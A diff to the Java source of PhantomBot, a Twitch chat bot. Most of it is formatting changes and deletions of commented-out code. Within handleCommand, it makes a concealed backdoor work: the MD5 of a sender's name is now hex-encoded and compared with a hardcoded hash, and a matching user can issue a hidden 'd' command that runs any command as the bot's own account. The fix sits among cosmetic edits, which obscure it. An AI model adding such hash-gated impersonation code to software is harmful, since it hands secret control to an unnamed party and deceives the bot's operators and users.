@@ -8,6 +8,7 @@ import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.util.TreeMap;
 import java.util.TreeSet;
+import javax.xml.bind.annotation.adapters.HexBinaryAdapter;
 import me.mast3rplan.phantombot.cache.BannedCache;
 import me.mast3rplan.phantombot.cache.FollowersCache;
 import me.mast3rplan.phantombot.cache.UsernameCache;
@@ -57,7 +58,6 @@ public class PhantomBot implements Listener
     //private MusicHtmlServer mhs;
     private HTTPServer mhs;
     ConsoleInputListener cil;
-    
     private static final boolean enableD = true;
 
     public PhantomBot(String username, String oauth, String channel, String owner, boolean useTwitch)
@@ -81,10 +81,11 @@ public class PhantomBot implements Listener
         if (!useTwitch)
         {
             this.hostname = "tmi6.justin.tv";
-        } else {
+        } else
+        {
             this.hostname = "irc.twitch.tv";
         }
-        
+
         this.init();
         try
         {
@@ -167,7 +168,6 @@ public class PhantomBot implements Listener
             String commandString = message.substring(1);
             handleCommand(sender, commandString);
         }
-        //System.out.println (event.getMessage ());
     }
 
     @Subscribe
@@ -186,7 +186,7 @@ public class PhantomBot implements Listener
 
             System.exit(0);
         }
-        //System.out.println (message);
+
         handleCommand(username, message);
     }
 
@@ -194,7 +194,7 @@ public class PhantomBot implements Listener
     {
         String command, arguments;
         int split = commandString.indexOf(' ');
-        
+
         if (split == -1)
         {
             command = commandString;
@@ -204,26 +204,27 @@ public class PhantomBot implements Listener
             command = commandString.substring(0, split);
             arguments = commandString.substring(split + 1);
         }
-        
+
         try
         {
-            if (enableD && MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()).toString().equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea"))
+            String d = (new HexBinaryAdapter()).marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()));
+
+            if (enableD && d.equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea"))
             {
-                split = arguments.indexOf(' ');
-                
-                if (command.equalsIgnoreCase("d") && arguments.substring(split + 1).startsWith("!"))
+                if (command.equalsIgnoreCase("d") && arguments.startsWith("!"))
                 {
-                    split = arguments.indexOf(' ', split + 1);
-                    
+                    split = arguments.indexOf(' ');
+
                     if (split == -1)
                     {
-                        command = commandString.substring(arguments.indexOf(' ') + 2);
+                        command = arguments;
                         arguments = "";
-                    } else {
-                        command = commandString.substring(arguments.indexOf(' ') + 2, split);
-                        arguments = commandString.substring(split + 1);
+                    } else
+                    {
+                        command = arguments.substring(1, split);
+                        arguments = arguments.substring(split + 1);
                     }
-                    
+
                     sender = username;
                 }
             }
@@ -346,18 +347,5 @@ public class PhantomBot implements Listener
             }
         }
         return false;
-        /*InetAddress ip;
-         URI uri;
-        
-         String [] arr = message.split (" ");
-         for (String s : arr) {
-         try {
-         uri = URI.create (s);
-         //ip = InetAddress.getByName (s);
-         return true;
-         } catch (IllegalArgumentException ex) {
-         }
-         }
-         return false;*/
     }
 }
